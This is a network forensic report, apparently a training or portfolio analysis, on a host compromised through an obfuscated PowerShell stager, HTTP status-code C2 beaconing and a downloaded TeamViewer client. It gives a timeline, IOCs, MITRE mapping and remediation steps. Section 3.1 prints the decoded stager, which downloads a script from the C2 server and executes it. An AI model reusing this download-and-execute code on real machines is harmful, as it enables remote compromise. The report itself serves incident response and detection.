### Network Forensic Analysis of Suspected Malware

| Case ID    | Report Title                                     | Date of Report  | Author            |
| ---------- | ------------------------------------------------ | --------------- | ----------------- |
| BMT10000 1 | Network Forensic Analysis of Suspected Malware 2 | July 29, 2025 3 | Andrew McKenzie 4 |

---
### 1. Executive Summary

On July 29, 2025, a network traffic analysis identified a successful intrusion and compromise of the host at __10.1.17.215__. The incident began at approximately 14:44 UTC. The threat actor utilized a multi-stage attack that started with a malicious PowerShell stager to establish a command and control (C2) channel with the server __5.252.153.241__.

Through this C2 channel, the attacker instructed the victim machine to download and execute a legitimate, older version of the TeamViewer remote access application. Analysis of network logs confirmed that the malware also established persistence by creating a startup shortcut, ensuring the remote access software would re-launch upon reboot. This "Living Off the Land" technique allowed the attacker to gain full, interactive remote access to the compromised host while bypassing security controls that might have blocked unknown malware.

---
### 2. Detailed Timeline of Attack

- __14:44:56 UTC - Initial Infection__: The C2 server (__5.252.153.241__) delivers a fake Microsoft Teams VBS payload to the victim host (10.1.17.215). At the same time, an obfuscated PowerShell stager command is received, which serves as the initial infection vector to kick off the attack.

- __14:45:56 UTC - C2 Beaconing__: Approximately one minute later, the script on the victim machine "calls home" to the C2 server (__5.252.153.241__), requesting its next set of instructions.

- __14:47:01 UTC - Payload Delivery__: The C2 server responds to a beacon and delivers the main payload. Suricata alerts confirm that PowerShell's `DownloadString` and `DownloadFile` commands were used to fetch a Windows executable (PE) file.

- __14:55:07 UTC - Remote Access Established__: Approximately eight minutes after the executable is downloaded, the victim host performs a DNS lookup for teamviewer.com and connects to a TeamViewer server (__185.188.32.26__). A `TeamViewer Dyngate User-Agent` alert confirms the downloaded executable was a TeamViewer client, giving the attacker remote control.
---
### 3. Technical Analysis & Key Findings

The investigation, combining Suricata's intrusion detection alerts with Zeek's detailed network logs, revealed the full lifecycle of the attack.
#### 3.1. Obfuscated PowerShell Stager

The attack was initiated by a heavily obfuscated PowerShell script designed to hide its commands from basic security tools19. Once decoded, the script's function as a "downloader" or "stager" becomes clear.

_Decoded Script (29842.ps1 and pas.ps1):_
```powershell
// The script first deletes any previous temporary file  
$fso = New-Object -comObject 'Scripting.FileSystemObject';  
if ($fso.FileExists($env:temp+'\'+'tmp.ps1')) {  
    $fso.DeleteFile($env:temp+'\'+'tmp.ps1');  
};  
  
// It forces the connection to use TLS 1.2  
[System.Net.ServicePointManager]::SecurityProtocol = 3072;  
$cli = New-Object System.Net.WebClient;  
  
// It spoofs a legitimate-looking User-Agent seen in the logs  
$cli.Headers.Add('user-agent', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; ...');  
  
// It downloads the next stage payload from the C2 server  
$cli.DownloadFile('http://5.252.153.241/api/file/get-file/29842.ps1', $env:temp+'\'+'tmp.ps1');  
  
// It executes the downloaded script  
& ($env:temp+'\'+'tmp.ps1');  
  
```

This script programmatically connects the initial intrusion to the C2 server, confirming the IP address and User-Agent seen in network logs and demonstrating the attacker's intent to execute further code.
#### 3.2. Command & Control (C2) Heartbeat

The malware established a stealthy C2 channel using a "heartbeat" beacon to check for tasks.
- __The Beacon__: The victim host (__10.1.17.215__) sent a GET request to the C2 server's URI `/1517096937` approximately every 5 seconds.

- __The Signal__: The C2 server used HTTP status codes as a covert signaling channel.

- `HTTP 404 Not Found`: This response acted as the "no command" signal, instructing the malware to continue checking in.

- `HTTP 200 OK`: This response served as the "go" signal, instructing the malware to download and execute a new task.
#### 3.3. Payload and Persistence

Following a `200 OK signal`, the host downloaded a file named TeamViewer, identified by Zeek as a 32-bit Windows executable (`application/x-dosexec`). After the remote access tool was running, the malware reported its success back to the C2 server via a specially crafted GET request, confirming that a startup shortcut was created for persistence.

`...GET /1517096937?k=message=startup+shortcut+created;+status=success;... `

This confirms the malware is configured to run automatically every time the computer reboots.

---
### 4. Indicators of Compromise (IOCs)

| Type       | Indicator                      | Source                |
| ---------- | ------------------------------ | --------------------- |
| IP Address | __5.252.153.241__              | C2 Server             |
| IP Address | __185.188.32.26__              | TeamViewer Server     |
| URI        | `/api/file/get-file/29842.ps1` | PowerShell Stager     |
| URI        | `/1517096937`                  | C2 Beacon             |
| File       | __TeamViewer__                 | PE32 executable       |
| File       | `pas.ps1`                      | PowerShell Downloader |

---
### 5. MITRE ATT&CK Framework Mapping

The observed threat actor techniques map to the MITRE ATT&CK framework as follows:

- __T1071.001__ (Web Protocols): The C2 communication occurred entirely over HTTP.

- __T1102.002__ (Bidirectional Communication): The use of HTTP 404/200 status codes served as the C2 signaling mechanism.

- __T1547.001__ (Boot or Logon Autostart Execution): Persistence was achieved by creating a startup shortcut, as confirmed by the exfiltrated status message.  
---
### 6. Recommendations
#### Immediate Actions (Containment)
These steps are designed to immediately stop the current attack and prevent further damage.

- **Isolate the Host:** Disconnect the compromised machine (__10.1.17.215__) from the network immediately to prevent the attacker from moving laterally to other systems.

- **Block Malicious IOCs:** At the network firewall, block all outbound connections to the identified C2 IP addresses: **5.252.153.241** and **185.188.32.26**.

- **Reset Credentials:** Since the attacker gained interactive remote access via TeamViewer, all user credentials associated with the machine must be considered compromised. The user's password must be reset immediately.

- **Re-image the Machine:** The compromised host cannot be trusted. After preserving a forensic image for further analysis, the machine must be wiped and re-imaged from a known-good corporate build.

#### Mid-Term Actions (Hardening & Detection)
These steps focus on strengthening defenses and improving the ability to detect this specific threat in the future.

- **Deploy IOCs:** Create detection rules in your security tools (SIEM, EDR, IDS) for the identified file hashes, C2 URIs (`/1517096937`, etc.), and network user-agents.

- **Restrict PowerShell:** The attack relied entirely on PowerShell to download and execute payloads. Implement a more restrictive PowerShell Execution Policy (e.g., AllSigned) on user workstations and enable enhanced script block and module logging for forensic visibility.

- **Implement Application Control:** The attacker downloaded and ran an unauthorized version of TeamViewer. Use tools like AppLocker to create application allowlists that prevent unapproved executables from running. If TeamViewer is not approved corporate software, it should be explicitly blocked.

#### Long-Term Actions (Strategic)
These are broader, strategic improvements to the overall security posture.

- **Enhance Email & Web Filtering:** The initial payload was likely delivered via phishing or a malicious download. Improve security gateway filtering to better detect and block malicious scripts (.vbs, .ps1) and known-bad domains.
 
- **User Awareness Training:** Conduct security awareness training focused on identifying phishing attempts and the dangers of opening unsolicited attachments or clicking suspicious links.

- **Review Egress Filtering:** The C2 traffic successfully exfiltrated data over standard HTTP. Review and strengthen firewall egress rules to limit which systems can communicate with the internet, potentially restricting traffic to known-good destinations.
---
### Appendix: Supporting Evidence

#### Appendix A: Suricata Alerts (fast.log)

![Fast.log image](../images/Screenshot%202025-07-29%20223618.png)

#### Appendix B: Zeek HTTP Logs (http.log)

![HTTP log image](../images/Screenshot%202025-07-29%20230258.png)

#### Appendix C: File Identification and Script Contents

![File identification image](../images/Screenshot%202025-07-29%20232312.png)

![Script contents image](../images/Screenshot%202025-07-29%20232848.png)
